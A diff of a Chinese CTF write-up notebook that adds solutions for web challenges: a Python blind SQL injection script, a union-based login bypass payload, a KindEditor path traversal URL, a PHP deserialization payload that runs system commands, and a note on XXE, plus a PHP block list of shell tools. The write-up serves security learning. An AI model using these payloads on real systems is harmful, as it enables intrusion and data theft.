@@ -2563,7 +2563,96 @@ https://www.cnblogs.com/leixiao-/p/9784904.html
 
 ### [CISCN2019 华北赛区 Day2 Web1]Hack World
 
-用 `1/1`判断出是数字型注入
+![image-20210524181023155](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524181023155.png)
+
+
+
+用 `1/1`判断出是数字型注入,过滤了空格、union、select、or、and等关键字。这个网页上提示了重要信息在flag.flag表中，
+
+这个题可以使用异或布尔盲注获取flag值，payload：
+
+~~~
+id=0^(ascii(mid((select(flag)from(flag)),1,1))>33)
+~~~
+
+![image-20210524182727624](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524182727624.png)
+
+如果(ascii(mid((select(flag)from(flag)),1,1))>33)语句为真的话，页面会回显Hello信息，编写python脚本，爆破flag值
+
+~~~python
+import time
+import sys
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+
+
+	select_str = "select(flag)from(flag)" #DIY地址
+	
+	# 连接payload
+	sqli_str = "0^(ascii(mid(("+ select_str +")," + str(char_index) + ",1))>" + str(ascii) + ")" #DIY地址
+	# print(sqli_str)
+	payload = {"id":sqli_str}  #DIY地址
+
+	return payload
+
+
+def execute(result_index, char_index, ascii):
+	# 连接url
+	url = "http://28ec8019-70ac-4dc1-90b8-4d84bae27b2c.node3.buuoj.cn/index.php"  #DIY地址
+	payload = getPayload(result_index, char_index, ascii)
+	# print(payload)
+	# 检查回显
+	echo = "Hello"            #DIY地址
+	content = requests.post(url, data=payload).text
+	time.sleep(0.1)
+	# print(content)
+	if echo in content:
+		return True
+	else:
+		return False
+
+
+def dichotomy(result_index, char_index, left, right):
+	while left < right:
+		# 二分法
+		ascii = int((left + right) / 2)
+		if execute(str(result_index), str(char_index + 1), str(ascii)):
+			left = ascii
+		else:
+			right = ascii
+		# 结束二分
+		if left == right - 1:
+			if execute(str(result_index), str(char_index + 1), str(ascii)):
+				ascii += 1
+				break
+			else:
+				break
+	return chr(ascii)
+
+
+if __name__ == "__main__":
+	for num in range(1):  # 查询结果的数量  #DIY地址
+		count = 0
+		for len in range(50):  # 单条查询结果的长度   #DIY地址
+			count += 1
+			char = dichotomy(num, len, 30, 126)
+			if ord(char) == 31:  # 单条查询结果已被遍历
+				break
+			sys.stdout.write(char)
+			sys.stdout.flush()
+		if count == 1:  # 查询结果已被遍历
+			break
+		sys.stdout.write("\r\n")
+		sys.stdout.flush()
+~~~
+
+最终结果：
+
+![image-20210524184008289](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184008289.png)
+
+
 
 ### [极客大挑战 2019]HardSQL
 
@@ -2633,11 +2722,49 @@ https://www.cnblogs.com/leixiao-/p/9784904.html
 
 ### [GXYCTF2019]BabySQli
 
-过滤了 `or、and`
+![image-20210524184108107](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184108107.png)
+
+页面显示是个登录框
+
+源码中发现了个search.php文件，点击此文件
+
+![image-20210524184255182](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184255182.png)
+
+查看源码，发现了注释中有东西，加密的字符，尝试一下base64不行，用base32再用base63解码，最后才成功
+
+![image-20210524184318745](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184318745.png)
+
+![image-20210524184635206](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184635206.png)
+
+出来了一个SQL语句： `select * from user where username = '$name'`,对应着初试网站的登录框的SQL语句吧。
+
+输入admaain用户名，显示错误的用户名
+
+![image-20210524185008439](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185008439.png)
+
+输入admin用户名，显示密码错误，看来数据库中存在admin用户
+
+![image-20210524185105942](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185105942.png)
+
+上面的SQL语句会根据name把用户名密码等字段信息显示出来，我们是否可以使用union select语句也添加一条暂时的数据。例如：
+
+![image-20210524185540017](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185540017.png)
+
+name存在SQL注入，可以使用上面的方法让后台代码执行我们伪造的SQL数据，从而成功登录
+
+![image-20210524185729951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185729951.png)
+
+`name=admin'union+select+1,2,3%23&pw=111`使用这条语句判断出user表有3列，应该就是id、name、pw字段了。
+
+payload：
 
 ~~~
-select * from user where username = '$name'
+name=aaa'union+select+1,'admin','698d51a19d8a121ce581499d7b701668'%23&pw=111
 ~~~
+
+其中69……字符串是111的MD5加密值，最后成功获得flag
+
+![image-20210524190244388](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524190244388.png)
 
 ### [SUCTF 2019]CheckIn
 
@@ -2910,7 +3037,7 @@ https://blog.csdn.net/qq_26406447/article/details/100711933
 
 ![image-20210521205411113](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205411113.png)
 
-下载完成之后，解压文件后发现，文件夹中的所有文件名字和文件中的内容都被编码了，看来需要写个脚本还原一下文件名
+下载完成之后，解压文件后发现，文件夹中的所有文件名字和文件中的内容都被编码了
 
 ![image-20210521205508938](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205508938.png)
 
@@ -3055,6 +3182,8 @@ payload:
 
 
 ### [GWCTF 2019]我有一个数据库
+
+数据库版本有文件包含漏洞，百度一下payload就可以了
 
 ![image-20210522172659715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522172659715.png)
 
@@ -3341,18 +3470,152 @@ if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmo
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ![image-20210523161315667](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523161315667.png)
+
+### 《从0到1：CTFer成长之路》题目——sql注入1
+
+经过测试，这题是单引号字符型注入![image-20210524110208950](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110208950.png)
+
+> `version`: 5.5.64-MariaDB-1ubuntu0.14.04.1  
+>
+> `database`: note
+>
+> `user`: root@localhost  
+
+获取所有数据库：
+
+![image-20210524110507171](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110507171.png)
+
+获取 `note`数据库中的表：
+
+![image-20210524110600886](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110600886.png)
+
+获取 `fl4g`表的所有字段：
+
+![image-20210524110703356](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110703356.png)
+
+获取`note.fl4g`表中的内容:
+
+![image-20210524110812372](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110812372.png)
+
+成功获得flag
+
+### “百度杯”CTF比赛 十二月场——Blog
+
+![image-20210524111619121](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524111619121.png)
+
+扫描目录发现了flag.php，但是里面什么都没有，估计是利用这个网站的漏洞去读取php源码
+
+
+
+~~~
+http://9a6a9de81cb44dc0ac52841e88c2ce803fdb51883d6b48b3.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../../ 
+~~~
+
+
+
+![image-20210524112618095](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524112618095.png)
+
+![image-20210524120228991](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524120228991.png)
+
+![image-20210524120239166](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524120239166.png)
+
+
+
+
+
+### [网鼎杯 2020 朱雀组]phpweb
+
+![image-20210524141929226](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524141929226.png)
+
+~~~php
+<?php
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die("Hacker...");
+        }
+    }
+    ?>
+~~~
+
+序列化魔术方法：
+
+> \_\_wakeup() //使用unserialize时触发
+>
+> \_\__sleep() //使用serialize时触发
+> \_\_destruct() //对象被销毁时触发
+> \_\_call() //在对象上下文中调用不可访问的方法时触发
+> \_\_callStatic() //在静态上下文中调用不可访问的方法时触发
+> \_\_get() //用于从不可访问的属性读取数据
+> \_\_set() //用于将数据写入不可访问的属性
+> \_\_isset() //在不可访问的属性上调用isset()或empty()触发
+> \_\_unset() //在不可访问的属性上使用unset()时触发
+> \_\_toString() //把类当作字符串使用时触发
+> \_\_invoke() //当脚本尝试将对象调用为函数时触发
+
+序列化payload：
+
+~~~php
+<?php
+ class Test {
+        var $p = "ls";
+        var $func = "system";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+$a = new Test();
+echo serialize($a);
+
+?>
+//结果：O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
+~~~
+
+![image-20210524143316796](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524143316796.png)
+
+但是找不到flag在哪。构造exp。
+
+~~~
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
+~~~
+
+![image-20210524150336787](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524150336787.png)
+
+### [NCTF2019]Fake XML cookbook
+
+本关卡考察的是XXE
+
+
+
+
+
+![image-20210524203423276](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203423276.png)
+
+直接读取/flag文件，获取flag值
+
+![image-20210524203643801](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203643801.png)
